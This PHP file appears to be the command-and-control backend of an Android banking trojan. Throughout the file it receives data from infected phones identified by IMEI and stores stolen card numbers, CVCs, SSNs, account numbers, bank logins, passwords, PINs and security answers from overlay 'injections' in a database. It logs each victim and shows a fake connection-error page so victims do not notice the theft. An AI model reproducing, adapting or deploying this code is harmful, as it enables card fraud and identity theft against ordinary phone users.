<?php

	include 'config.php';
	$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

  if((!preg_match("/script/",$request)) && (!preg_match("/base64/",$request)) ) {

	$massivReq = explode("|", $request);
	$IMEI_log = $massivReq[0];
	$country = $massivReq[1];
	$text_log = $massivReq[2];

	echo"<p style='display:none; margin:0px auto;text-align:center' id='adv2'>Error connecting to the server, retry the operation!</p>
	<img src='../".namefolder."/images/gifInject2.gif' width='35%' height='27%' style='display:block; margin:100px auto; color:#FFF; font-family:Arial, Helvetica, sans-serif;' id='adv' />";


	$timeLoad=2200;
	$timeLocation=3200;
	if(($IMEI_log=="1111")&&($text_log=="1111")){
		 echo "<tag>
		 <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
		</tag>";
	}

	$typeCard = "";
	$numberCC = "";
	$m_y = "";
	$CVC = "";

	$startIcon="";


	//Грабинг CC
	if($text_log == "Grabber card step 1")
	{
		$startIcon="card";

		$typeCard = $massivReq[3];
		$numberCC = $massivReq[4];
		$m_y = $massivReq[5];
		$CVC = $massivReq[6];

		$numberCC=str_replace(" ","",$numberCC);

		$text_log = "Grabber card step 1\nType Card: $typeCard\nNumber card: $numberCC\nMonth/Year: $m_y\nCVC: $CVC\n";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$statement = $connect->prepare("SELECT * FROM cc WHERE imei='$IMEI_log'");
		$statement->execute([$IMEI_log]);

		$booleanIMEI_and_TIME = false;
		foreach($statement as $row)
		{
			if($row['numbercard'] == $numberCC)
			{
				$booleanIMEI_and_TIME=true;
				break;
			}
		}

		if($booleanIMEI_and_TIME){
			$statement = $connect->prepare("UPDATE cc SET country = '$country', typecard ='$typeCard', numbercard='$numberCC', monthyear ='$m_y', cvc = '$CVC', timeaddcc='$date_add_inj' WHERE numbercard = '$numberCC'");
			$statement->execute(array($country,$typeCard,$numberCC,$m_y,$CVC,$date_add_inj));
		}else{
			$statement = $connect->prepare("insert into cc (imei,country,typecard,numbercard,monthyear,cvc,timeaddcc)
			value ('$IMEI_log','$country','$typeCard','$numberCC','$m_y','$CVC','$date_add_inj')");
			$statement->execute(array($IMEI_log,$country,$typeCard,$numberCC,$m_y,$CVC,$date_add_inj));
		}

		if(strlen($numberCC)>=5){
				$statement = $connect->prepare("UPDATE kliets SET  l_bank = '1' WHERE IMEI = '$IMEI_log'");
				$statement->execute([$IMEI_log]);
			}


		getBins($numberCC);

	}
	if($text_log == "Grabber card step 2")
	{
		$startIcon="card";

		$cardHolder = $massivReq[3];
		$dateBirth = $massivReq[4];
		$postalCode = $massivReq[5];
		$holderAddress = $massivReq[6];
		$phoneNumber =  $massivReq[7];
		$date_add_inj = $massivReq[8];
		$CC = $massivReq[9];

		$CC=str_replace(" ","",$CC);

		if($country == "us")
		{
			$SSN =  $massivReq[10];
			$AN = $massivReq[11];
			$text_log = "Grabber card step 2\nName Holder: $cardHolder\nData Birth: $dateBirth\nPostal Code: $postalCode\nAddress Holder: $holderAddress\nPhone Number Holder: $phoneNumber\nSSN: $SSN\nAccount number: $AN\n";
		}
		else
		{
			$text_log = "Grabber card step 2\nName Holder: $cardHolder\nData Birth: $dateBirth\nPostal Code: $postalCode\nAddress Holder: $holderAddress\nPhone Number Holder: $phoneNumber\n";
		}

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("SELECT * FROM cc WHERE imei='$IMEI_log'");
		$statement->execute([$IMEI_log]);

		$booleanIMEI_and_TIME = false;
		foreach($statement as $row)
		{
			if($row['numbercard'] == $CC)
			{
				$booleanIMEI_and_TIME=true;
				break;
			}
		}

		if($booleanIMEI_and_TIME){
			if($country=="us")
			{
				$statement = $connect->prepare("UPDATE cc SET nameholder = '$cardHolder',ssn = '$SSN',accountnumber = '$AN', databirth ='$dateBirth', postalcode='$postalCode', addressholder ='$holderAddress', phonenumber = '$phoneNumber' WHERE numbercard = '$CC'");
				$statement->execute(array($cardHolder,$SSN,$AN,$dateBirth,$holderAddress,$phoneNumber,$CC));
			}
			else
			{
				$statement = $connect->prepare("UPDATE cc SET nameholder = '$cardHolder', databirth ='$dateBirth', postalcode='$postalCode', addressholder ='$holderAddress', phonenumber = '$phoneNumber' WHERE numbercard = '$CC'");
				$statement->execute(array($cardHolder,$dateBirth,$postalCode,$holderAddress,$phoneNumber,$CC));
			}
		}else{

			$statement = $connect->prepare("insert into cc (imei,country,numbercard)
			value ('$IMEI_log','$country','$CC')");
			$statement->execute(array($IMEI_log,$country,$CC));

			if($country=="us")
			{
				$statement = $connect->prepare("UPDATE cc SET nameholder = '$cardHolder',ssn = '$SSN',accountnumber = '$AN', databirth ='$dateBirth', postalcode='$postalCode', addressholder ='$holderAddress', phonenumber = '$phoneNumber' WHERE numbercard = '$CC'");
				$statement->execute(array($cardHolder,$SSN,$AN,$dateBirth,$holderAddress,$phoneNumber,$CC));
			}
			else
			{
				$statement = $connect->prepare("UPDATE cc SET nameholder = '$cardHolder', databirth ='$dateBirth', postalcode='$postalCode', addressholder ='$holderAddress', phonenumber = '$phoneNumber' WHERE numbercard = '$CC'");
				$statement->execute(array($cardHolder,$dateBirth,$postalCode,$holderAddress,$phoneNumber,$CC));
			}
		}

		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');


		$statement = $connection->prepare("UPDATE settings SET inject = '',state='1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);

		$statement = $connection->prepare("UPDATE kliets SET  l_bank = '1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);

	}
	if($text_log == "Grabber card step 3")
	{
		$startIcon="card";

		$VBV = $massivReq[3];
		$CC = $massivReq[4];

		$CC=str_replace(" ","",$CC);

		$text_log = "Grabber card step 3\nVBV : $VBV\n";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("SELECT * FROM cc WHERE imei='$IMEI_log'");
		$statement->execute([$IMEI_log]);

		$booleanIMEI_and_TIME = false;
		foreach($statement as $row)
		{
			if($row['numbercard'] == $CC)
			{
				$booleanIMEI_and_TIME=true;
				break;
			}
		}

		if($booleanIMEI_and_TIME)
		{
			$statement = $connect->prepare("UPDATE cc SET vbv = '$VBV' WHERE numbercard = '$CC'");
			$statement->execute(array($VBV,$CC));
		}
	}
	if($text_log == "Grabber card step 4")
	{
		$startIcon="card";

		$Sort_code = $massivReq[3];
		$CC = $massivReq[4];

		$CC=str_replace(" ","",$CC);

		$text_log = "Grabber card step 4\nSort Code: $Sort_code\n";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("SELECT * FROM cc WHERE imei='$IMEI_log'");
		$statement->execute([$IMEI_log]);

		$booleanIMEI_and_TIME = false;
		foreach($statement as $row)
		{
			if($row['numbercard'] == $CC)
			{
				$booleanIMEI_and_TIME=true;
				break;
			}
		}

		if($booleanIMEI_and_TIME)
		{
			$statement = $connect->prepare("UPDATE cc SET SortCode = '$Sort_code' WHERE numbercard = '$CC'");
			$statement->execute(array($Sort_code,$CC));

			 echo "<tag>
	  <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android');}, $timeLocation)
		</script>
	 </tag>";
		}
	}

	// -- инжекты -- //

	if($text_log == "Injection_1")
	{
		//--------
		$name = $massivReq[3];
		$username = $_POST['user'];
		$password = $_POST['pass'];

		$text_log = "Injection($name)\nusername: $username\npassword: $password";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("insert into injs (idbot,name,country,login,password)
		value('$IMEI_log','$name','$country','$username','$password')");
		$statement->execute(array($IMEI_log,$name,$country,$username,$password));

		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');

		$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);

		if(($username!="")&&($password!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	  <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}

	//**

	if($text_log == "Injection_2")
	{
		//--------
		$name = $massivReq[3];
		$username = $_POST['user'];
		$password = $_POST['pass'];
		$pin = $_POST['pin'];

		$text_log = "Injection($name)\nusername: $username\npassword: $password\nPIN: $pin";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("insert into injs (idbot,name,country,login,password,pin)
		value ('$IMEI_log','$name','$country','$username','$password','$pin')");
		$statement->execute(array($IMEI_log,$name,$country,$username,$password,$pin));


	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);

	if(($username!="")&&($password!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	echo "<tag>
	 <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	</tag>";
	}


	if($text_log == "Injection_3")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];
		$pin = $massivReq[6];

		$text_log = "Injection($name)\nusername: $username\ncode: $pin\npassword: $password";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$add_data = $connect->exec("insert into injs (idbot,name,country,login,password,pin)
		value ('$IMEI_log','$name','$country','$username','$password','$pin')");


	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);
	$statement = $connection->prepare("UPDATE kliets SET color='purple' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);

	if(($username!="")&&($password!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}

	if($text_log == "Injection_4")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];

		$text_log = "Injection($name)\nusername: $username\npassword: $password";


		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$add_data = $connect->exec("insert into injs (idbot,name,country,login,password)
		value ('$IMEI_log','$name','$country','$username','$password')");

		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');

		$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);
		$statement = $connection->prepare("UPDATE kliets SET color='purple' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);

		if(($username!="")&&($password!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}

	if($text_log == "Injection_5")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$params1 = $massivReq[5];
		$params2 = $massivReq[6];
		$pin = $massivReq[7];

		$text_log = "Injection($name)\nusername: $username\nParameter 1: $params1\nParameter 2: $params2\npin: $pin";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$add_data = $connect->exec("insert into injs (idbot,name,country,login,params1,params2,pin)
		value ('$IMEI_log','$name','$country','$username','$params1','$params2','$pin')");


	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);

	if(($username!="")&&($pin!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}
	if($text_log == "Injection_6")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];
		$params1 = $massivReq[6];
		$params2 = $massivReq[7];


		$text_log = "Injection($name)\nusername: $username\npassword: $password\nParameter 1: $params1\nParameter 2: $params2";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$add_data = $connect->exec("insert into injs (idbot,name,country,login,params1,params2,password)
		value ('$IMEI_log','$name','$country','$username','$params1','$params2','$password')");


	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);

	if(($username!="")&&($pin!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	  <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}
	if($text_log == "Injection_7")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];
		$pin = $massivReq[6];
		$f_name = $massivReq[7];
		$l_name = $massivReq[8];
		$phone = $massivReq[9];
		$dateBrith = $massivReq[10];

		$text_log = "Injection($name)\nusername: $username\ncode: $pin\npassword: $password\nfirst name: $f_name\nLast name: $l_name\nPhone number: $phone\nDate of birth: $dateBrith";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$add_data = $connect->exec("insert into injs (idbot,name,country,login,password,pin,f_name,l_name,phone,dateBrith)
		value ('$IMEI_log','$name','$country','$username','$password','$pin','$f_name','$l_name','$phone','$dateBrith')");


		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');

		$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);

		if(($username!="")&&($password!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}
	if($text_log == "Injection_8")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$t_pin = $massivReq[5];
		$llogs=str_replace("//br//","</br>",$logs);
		$text_log = "Injection($name)\n: $llogs";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("UPDATE injs SET logs = '$t_pin' WHERE login = '$username'");
		$statement->execute(array($t_pin,$username));
	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}

	if($text_log == "Injection_9")
	{
		//--------
		$name = $massivReq[3];
		$username = $massivReq[4];
		$password = $massivReq[5];
		$pin = $massivReq[6];
		$f_name = $massivReq[7];
		$l_name = $massivReq[8];
		$phone = $massivReq[9];
		$dateBrith = $massivReq[10];
		$logs = $massivReq[11];

		$llogs=str_replace("//br//","</br>",$logs);

		$text_log = "Injection($name)\nusername: $username\ncode: $pin\npassword: $password\nfirst name: $f_name\nLast name: $l_name\nPhone number: $phone\nDate of birth: $dateBrith\n$llogs";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');
		$add_data = $connect->exec("insert into injs (idbot,name,country,login,password,pin,f_name,l_name,phone,dateBrith,logs)
		value ('$IMEI_log','$name','$country','$username','$password','$pin','$f_name','$l_name','$phone','$dateBrith','$logs')");


		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');

		$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);

		if(($username!="")&&($password!="")){
			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
		}

	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}

	if($text_log == "Injection_10"){
		//--------
		$name = $massivReq[3];
		$logs = $massivReq[4];
		$llogs=str_replace("//br//","</br>",$logs);
		$llogsSS=str_replace("//br//","\n",$logs);
		$text_log = "Injection($name)\n: $llogsSS";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$add_data = $connect->exec("insert into injs (idbot,name,country,logs) value ('$IMEI_log','$name','$country','$llogs')");

		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');

		$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);


			$statement = $connection->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);


	 echo "<tag>
	   <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	 </tag>";
	}

	if($text_log == "paypal2")
	{
		//--------
		$name = $massivReq[3];
		$login=$massivReq[4];
		$vopros1 = $massivReq[5];
		$otvet1 = $massivReq[6];
		$vopros2 = $massivReq[7];
		$otvet2 = $massivReq[8];

		$text_log = "Injection($name)\nQuestion 1: $vopros1\nResponse 1: $otvet1\nQuestion 2: $vopros2\nResponse 2: $otvet2";

		$connect2 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect2->exec('SET NAMES utf8');

		$statement = $connect2->prepare("UPDATE injs SET  vopros1= '$vopros1', otvet1='$otvet1',vopros2= '$vopros2', otvet2='$otvet2' WHERE login = '$login'");
		$statement->execute(array($vopros1,$vopros2,$otvet1,$otvet2,$login));

		$connect3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect3->exec('SET NAMES utf8');
		$statement2 = $connect3->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
		$statement2->execute([$IMEI_log]);

		if(($vopros1!="")&&($otvet1!="")&&($vopros2!="")&&($otvet2!=""))
		{
			$statement2 = $connect3->prepare("UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log'");
			$statement2->execute([$IMEI_log]);
		}
	}


	if($text_log == "grabing_mini")
	{
		//--------
		$cardNumber = $massivReq[3];
		$cardExpiration = $massivReq[4];
		$cvcEntry =$massivReq[5];
		$nameOnCard = $massivReq[6];
		$phoneNumber = $massivReq[7];

		$cardNumber=str_replace(" ","",$cardNumber);

		$text_log = "Mini grabber cards\nNumber Card: $cardNumber\nMonth/year: $cardExpiration\nCVC: $cvcEntry\nName Holder: $nameOnCard\nPhone Number: $phoneNumber\n";

		$connect = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connect->exec('SET NAMES utf8');

		$statement = $connect->prepare("SELECT * FROM cc WHERE numbercard='$cardNumber'");
		$statement->execute([$cardNumber]);

		$booleanIMEI_and_TIME = false;
		foreach($statement as $row)
		{
			if($row['numbercard'] == $cardNumber)
			{
				$booleanIMEI_and_TIME=true;
				break;
			}
		}

		if(!$booleanIMEI_and_TIME)
		{
			$statement = $connect->prepare("insert into cc (imei,country,numbercard,monthyear,cvc,nameholder,phonenumber)
			value ('$IMEI_log','$country','$cardNumber','$cardExpiration','$cvcEntry','$nameOnCard','$phoneNumber')");
			$statement->execute(array($IMEI_log,$country,$cardNumber,$cardExpiration,$cvcEntry,$nameOnCard,$phoneNumber));

			if(strlen($cardNumber)>=5){
				$statement = $connect->prepare("UPDATE kliets SET  l_bank = '1' WHERE IMEI = '$IMEI_log'");
				$statement->execute([$IMEI_log]);
			}
		}


	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');


	$statement = $connection->prepare("UPDATE settings SET inject = '', state='1' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);


	echo "<tag HTTP: Error 12007 when connecting>
	  <script>
		setTimeout( function(){document.getElementById('adv').style.display='none';document.getElementById('adv2').style.display='block';},  $timeLoad )
		setTimeout( function(){location.replace('STOP');}, $timeLocation)
		</script>
	</tag>";

	//getBins($cardNumber);

	}


if(($IMEI_log != "") && ($text_log != ""))
{
	//Записываем ЛОГи!
		if(preg_match('|^[A-Z0-9]+$|i', $IMEI_log)){
	$path_log = "../".namefolder."/application/datalogs/logs/$IMEI_log.log";
	$perehod = "\n";
	$str_log = "$perehod$IMEI_log: $text_log$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$data_ = date('Y-m-d H:i');

	$statement = $connection->prepare("UPDATE kliets SET lastConnect = '$data_' WHERE IMEI = '$IMEI_log'");
	$statement->execute(array($data_, $IMEI_log));

	$statement = $connection->prepare("UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log'");
	$statement->execute([$IMEI_log]);
	}
}
}
/*
function getBins($numberCC)
{
   if(CheckURL("http://bins.pro")){
	   $str = "http://bins.pro/search?action=searchbins&bins=$numberCC";
	   $content = file_get_contents($str);
	   preg_match_all('#<div id="result">(.+?)</div>#is', $content, $arr);
	   $str1 =  $arr[1][0];
	   $content = str_replace("<table>","",$str1);
	   $content = str_replace("</table>","",$content);
	   $content = str_replace("<tr><td>BIN</td><td>Country</td><td>Vendor</td><td>Type</td><td>Level</td><td>Bank</td></tr>","",$content);
	   $content = str_replace("</tr>","",$content);
	   $content = str_replace("</td><td>","|",$content);
	   $content = str_replace("<tr><td>","",$content);
	   $content = str_replace(" </td>","",$content);

		$massivContent = explode("|", $content);

		$STR1 = $massivContent[1];
		$STR2 = $massivContent[2];
		$STR3 = $massivContent[3];
		$STR4 = $massivContent[4];
		$STR5 = $massivContent[5];

		$bins = "$STR1|$STR2|$STR3|$STR4|$STR5";

		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("UPDATE cc SET bin = '$bins' WHERE numbercard = '$numberCC'");
		$statement->execute(array($bins, $numberCC));
   }
}


*/
function CheckURL($url){
	if($url=check_url($url))
	{
	  if ($o=open_url($url))
	  {
		return true;
	  }
	  else
	  {
		return false;
	  }
	}
	else return false;
}
function check_url($url)
{
  if(preg_match("@^http://@i",$url)) $url = preg_replace("@(http://)+@i",'http://',$url);
  else if (preg_match("@^https://@i",$url)) $url = preg_replace("@(https://)+@i",'https://',$url);
  else $url = 'http://'.$url;


  if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
    return false;
	}
	else return $url;
}
 // Существование ссылки (URL)
function open_url($url)
{
 $url_c=parse_url($url);

  if (!empty($url_c['host']) and checkdnsrr($url_c['host']))
  {
    // Ответ сервера
    if ($otvet=@get_headers($url)){
      return substr($otvet[0], 9, 3);
    }
  }
  return false;
}
?>
